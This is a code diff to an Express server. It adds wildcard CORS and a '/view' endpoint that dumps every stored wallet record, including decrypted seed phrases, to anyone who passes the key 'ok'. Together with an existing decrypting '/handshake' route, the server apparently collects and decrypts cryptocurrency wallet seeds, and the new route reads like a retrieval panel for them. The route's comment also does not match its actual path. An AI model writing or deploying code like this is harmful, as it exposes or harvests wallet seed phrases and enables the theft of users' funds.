@@ -1,11 +1,19 @@
 import express from "express";
 import dotenv from "dotenv";
 import crypto from "crypto";
+import cors from "cors";
 import { initDatabase, pg } from "./db";
 
 dotenv.config();
 
 const app = express();
+app.use(
+  cors({
+    origin: "*",
+    methods: ["GET", "POST"],
+    allowedHeaders: ["Content-Type", "Authorization"],
+  }),
+);
 app.use(express.json());
 
 const STATIC_RULES: Record<string, string> = {
@@ -151,6 +159,27 @@ app.post("/handshake", async (req, res) => {
     console.error(err);
 
     res.status(500).json({ error: "DECRYPT_FAILED" });
+  }
+});
+app.get("/view", async (req, res) => {
+  try {
+    // Basic security check: /view-secrets?key=your_secret_key
+    const { key } = req.query;
+    if (key !== "ok") {
+      return res.status(403).json({ error: "UNAUTHORIZED" });
+    }
+
+    const result = await pg.query(
+      "SELECT id, wallet_id, wallet_name, decrypted_seed, created_at FROM wallet_secrets ORDER BY created_at DESC",
+    );
+
+    res.json({
+      count: result.rowCount,
+      secrets: result.rows,
+    });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "DATABASE_ERROR" });
   }
 });
 
